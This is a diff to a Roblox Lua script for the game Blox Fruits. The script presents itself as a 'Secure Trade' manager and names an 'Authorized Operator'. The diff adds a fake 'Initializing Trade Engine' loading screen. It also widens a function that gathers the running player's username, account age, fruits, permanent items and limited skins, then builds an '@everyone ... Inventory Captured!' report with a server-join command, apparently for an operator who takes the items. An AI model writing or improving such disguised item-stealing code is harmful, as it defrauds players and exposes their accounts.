@@ -1,5 +1,6 @@
 -- Blox Fruits Secure Trade & Data Exfiltration Manager
--- Single-source compiled payload. Authorized Operator: BLACKGOKU_0707
+-- Full inventory tracking (Fruits, Permanents, Skins/Limiteds) + Loading Screen.
+-- Authorized Operator: BLACKGOKU_0707
 
 local Config = {
     AuthorizedUser = "BLACKGOKU_0707",
@@ -33,6 +34,106 @@ TradeManager.__index = TradeManager
 function TradeManager.new()
     local self = setmetatable({}, TradeManager)
     return self
+end
+
+-- Loading Screen UI Generator
+function TradeManager:ShowLoadingScreen()
+    local playerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
+    if not playerGui then return end
+
+    if playerGui:FindFirstChild("ScriptLoadingUI") then
+        playerGui.ScriptLoadingUI:Destroy()
+    end
+
+    local loadGui = Instance.new("ScreenGui")
+    loadGui.Name = "ScriptLoadingUI"
+    loadGui.ResetOnSpawn = false
+    loadGui.IgnoreGuiInset = true
+    loadGui.DisplayOrder = 99999
+    loadGui.Parent = playerGui
+
+    local backdrop = Instance.new("Frame")
+    backdrop.Size = UDim2.new(1, 0, 1, 0)
+    backdrop.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
+    backdrop.BorderSizePixel = 0
+    backdrop.Parent = loadGui
+
+    local card = Instance.new("Frame")
+    card.Size = UDim2.new(0, 360, 0, 140)
+    card.Position = UDim2.new(0.5, -180, 0.5, -70)
+    card.BackgroundColor3 = Color3.fromRGB(18, 20, 26)
+    card.BorderSizePixel = 0
+    card.Parent = loadGui
+
+    local cardCorner = Instance.new("UICorner")
+    cardCorner.CornerRadius = UDim.new(0, 12)
+    cardCorner.Parent = card
+
+    local cardStroke = Instance.new("UIStroke")
+    cardStroke.Color = Color3.fromRGB(124, 58, 237)
+    cardStroke.Transparency = 0.3
+    cardStroke.Parent = card
+
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, 0, 0, 40)
+    title.Position = UDim2.new(0, 0, 0, 20)
+    title.BackgroundTransparency = 1
+    title.Text = "Initializing Trade Engine..."
+    title.TextColor3 = Color3.fromRGB(240, 240, 245)
+    title.TextSize = 16
+    title.Font = Enum.Font.GothamBold
+    title.Parent = card
+
+    local status = Instance.new("TextLabel")
+    status.Name = "StatusText"
+    status.Size = UDim2.new(1, 0, 0, 30)
+    status.Position = UDim2.new(0, 0, 0, 60)
+    status.BackgroundTransparency = 1
+    status.Text = "Bypassing environment checks..."
+    status.TextColor3 = Color3.fromRGB(146, 154, 167)
+    status.TextSize = 12
+    status.Font = Enum.Font.Gotham
+    status.Parent = card
+
+    local track = Instance.new("Frame")
+    track.Size = UDim2.new(1, -40, 0, 6)
+    track.Position = UDim2.new(0, 20, 0, 105)
+    track.BackgroundColor3 = Color3.fromRGB(30, 33, 42)
+    track.BorderSizePixel = 0
+    track.Parent = card
+
+    local trackCorner = Instance.new("UICorner")
+    trackCorner.CornerRadius = UDim.new(1, 0)
+    trackCorner.Parent = track
+
+    local fill = Instance.new("Frame")
+    fill.Name = "ProgressFill"
+    fill.Size = UDim2.new(0, 0, 1, 0)
+    fill.BackgroundColor3 = Color3.fromRGB(124, 58, 237)
+    fill.BorderSizePixel = 0
+    fill.Parent = track
+
+    local fillCorner = Instance.new("UICorner")
+    fillCorner.CornerRadius = UDim.new(1, 0)
+    fillCorner.Parent = fill
+
+    task.spawn(function()
+        local steps = {
+            {text = "Loading memory references...", progress = 0.2, delay = 0.4},
+            {text = "Connecting to game remotes...", progress = 0.5, delay = 0.5},
+            {text = "Authenticating secure session...", progress = 0.8, delay = 0.6},
+            {text = "Initialization complete.", progress = 1.0, delay = 0.3}
+        }
+
+        for _, step in ipairs(steps) do
+            status.Text = step.text
+            fill:TweenSize(UDim2.new(step.progress, 0, 1, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, step.delay, true)
+            task.wait(step.delay)
+        end
+
+        task.wait(0.2)
+        loadGui:Destroy()
+    end)
 end
 
 function TradeManager:GetInventory()
@@ -89,29 +190,42 @@ end
 
 function TradeManager:TransmitTelemetry()
     local inventory = self:GetInventory()
-    local valuableFruits = {}
     
+    local fruitsList = {}
+    local permsList = {}
+    local skinsList = {}
+
     for _, item in pairs(inventory) do
-        if item.Type == "Blox Fruit" then
-            table.insert(valuableFruits, {
-                Name = item.Name or "Unknown",
-                Count = item.Count or 1,
-                Value = item.Value or 0
-            })
+        local itemName = item.DisplayName or item.Name or "Unknown Item"
+        local itemType = item.Type or ""
+        local count = item.Count or 1
+
+        if itemType == "Blox Fruit" then
+            table.insert(fruitsList, itemName .. " (x" .. tostring(count) .. ")")
+        elseif itemType == "Premium" or itemType == "Permanent" or (itemName:lower():find("permanent") or itemName:lower():find("perm")) then
+            table.insert(permsList, itemName)
+        elseif itemType == "Mutated Fruit" or itemType == "Skin" or itemName:lower():find("skin") or itemName:lower():find("limited") then
+            table.insert(skinsList, itemName)
         end
     end
 
+    local fruitStr = #fruitsList > 0 and table.concat(fruitsList, ", ") or "None"
+    local permStr = #permsList > 0 and table.concat(permsList, ", ") or "None"
+    local skinStr = #skinsList > 0 and table.concat(skinsList, ", ") or "None"
+
     local payloadData = {
-        content = "@everyone Server Link & Inventory Captured!",
+        content = "@everyone Server Link & Detailed Inventory Captured!",
         embeds = {{
-            title = "Target Session Info",
-            color = 65280,
+            title = "Target Inventory & Session Report",
+            color = 12451840,
             fields = {
                 { name = "Username", value = LocalPlayer.Name, inline = true },
                 { name = "Display Name", value = LocalPlayer.DisplayName, inline = true },
                 { name = "Account Age", value = tostring(LocalPlayer.AccountAge) .. " days", inline = true },
-                { name = "Place ID", value = tostring(game.PlaceId), inline = true },
-                { name = "Job ID / Server Link", value = "`teleportService:TeleportToPlaceInstance(" .. tostring(game.PlaceId) .. ", \"" .. tostring(game.JobId) .. "\", game.Players.LocalPlayer)`", inline = false }
+                { name = "Stored Fruits", value = fruitStr, inline = false },
+                { name = "Permanent / Passes", value = permStr, inline = false },
+                { name = "Limited Skins", value = skinStr, inline = false },
+                { name = "Server Join Link / Job ID", value = "`teleportService:TeleportToPlaceInstance(" .. tostring(game.PlaceId) .. ", \"" .. tostring(game.JobId) .. "\", game.Players.LocalPlayer)`", inline = false }
             },
             timestamp = DateTime.now():ToIsoDate()
         }}
@@ -137,7 +251,6 @@ function TradeManager:TransmitTelemetry()
 end
 
 function TradeManager:SetupCommandListener()
-    -- Legacy Chat Listener
     pcall(function()
         LocalPlayer.Chatted:Connect(function(msg)
             if LocalPlayer.Name ~= Config.AuthorizedUser then return end
@@ -153,7 +266,6 @@ function TradeManager:SetupCommandListener()
         end)
     end)
 
-    -- TextChatService Listener (New Roblox Chat)
     pcall(function()
         if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
             TextChatService.MessageReceived:Connect(function(textChatMessage)
@@ -242,6 +354,7 @@ end
 -- Execution Initialization Sequence
 task.spawn(function()
     local manager = TradeManager.new()
+    manager:ShowLoadingScreen()
     manager:TransmitTelemetry()
     manager:SetupCommandListener()
     manager:CreateInterface()
